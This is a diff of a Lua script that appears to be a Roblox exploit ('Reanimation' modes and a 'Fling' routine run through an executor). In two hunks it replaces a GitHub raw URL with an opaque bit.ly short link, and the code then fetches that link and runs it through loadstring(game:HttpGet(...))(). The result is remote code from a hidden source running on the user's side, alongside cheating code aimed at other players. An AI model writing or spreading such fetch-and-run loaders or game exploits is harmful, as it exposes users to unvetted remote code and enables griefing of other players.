@@ -11,7 +11,7 @@ if getgenv().Reanimation == "PermaDeath" or getgenv().Reanimation == nil then
 	getgenv().ExtremeNetless = false
 	end
 	getgenv().ShowReal = true
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/newnetlessreanimate.lua"))()
+	loadstring(game:HttpGet("https://bit.ly/34mO4Uc"))()
 	task.wait()
 	local Fling = game.Players.LocalPlayer.Character[game.Players.LocalPlayer.Name]:FindFirstChild("LowerTorso") or game.Players.LocalPlayer.Character[game.Players.LocalPlayer.Name].HumanoidRootPart
 	Fling.Transparency = 1
@@ -54,7 +54,7 @@ elseif Reanimation == "Simple" then
 	end
 	getgenv().ShowReal = true
 	getgenv().Optimizer = false
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/newnetlessreanimate.lua"))()
+	loadstring(game:HttpGet("https://bit.ly/34mO4Uc"))()
 	task.wait()
 	local plr = game.Players.LocalPlayer
     local chr = plr.Character
